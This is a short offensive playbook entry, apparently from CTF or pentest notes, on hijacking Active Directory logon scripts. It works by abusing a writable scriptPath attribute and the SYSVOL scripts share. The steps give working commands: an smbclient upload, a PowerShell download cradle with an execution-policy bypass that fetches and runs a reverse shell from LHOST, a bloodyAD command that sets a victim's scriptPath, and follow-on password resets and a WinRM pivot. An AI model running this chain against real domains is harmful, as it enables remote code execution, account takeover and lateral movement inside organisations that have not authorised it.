# Logon Script Hijack via scriptPath + NETLOGON write

Trigger: AD domain where a low-priv principal has WriteProperty scoped to a user's
`scriptPath` attribute (GUID bf9679a8-0de6-11d0-a285-00aa003049e2) and write access to
the NETLOGON/SYSVOL scripts share, and something executes that logon script.

## Procedure
1. Dump raw `nTSecurityDescriptor` DACLs; BloodHound hides attribute-scoped WriteProp.
   Look for the scriptPath GUID, often inherited from `CN=Users`.
2. Confirm share write: `smbclient //DC/SYSVOL -c 'cd DOMAIN/scripts; put test.bat'`.
3. Serve a download cradle (easier to debug than inline base64) from an HTTP server:
   `@echo off` + `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST:PORT/rev.ps1')"`.
4. Overwrite an existing script the user already points at (e.g. printerDetect.bat), then:
   `bloodyAD --host DC -d DOMAIN -u USER -p PASS set object "CN=Victim,CN=Users,DC=..." scriptPath -v printerDetect.bat`
5. Start a listener, then re-run the same `set object` command to re-trigger execution.
6. Use the shell in the victim's context for ACL actions (e.g. ADSI `SetPassword` on a
   user the victim has ForceChangePassword over), then pivot to WinRM as the new user.

## Pitfalls
- Inline AD mutations inside the batch file can fail in the logon-script context; use a
  real reverse shell.
- Ensure `\\DOMAIN\NETLOGON` resolves to the DC that hosts the writable script.
- If no callback, re-set scriptPath; simulations may poll on an interval.
- Clean up scriptPath/script after use to avoid repeated callbacks.
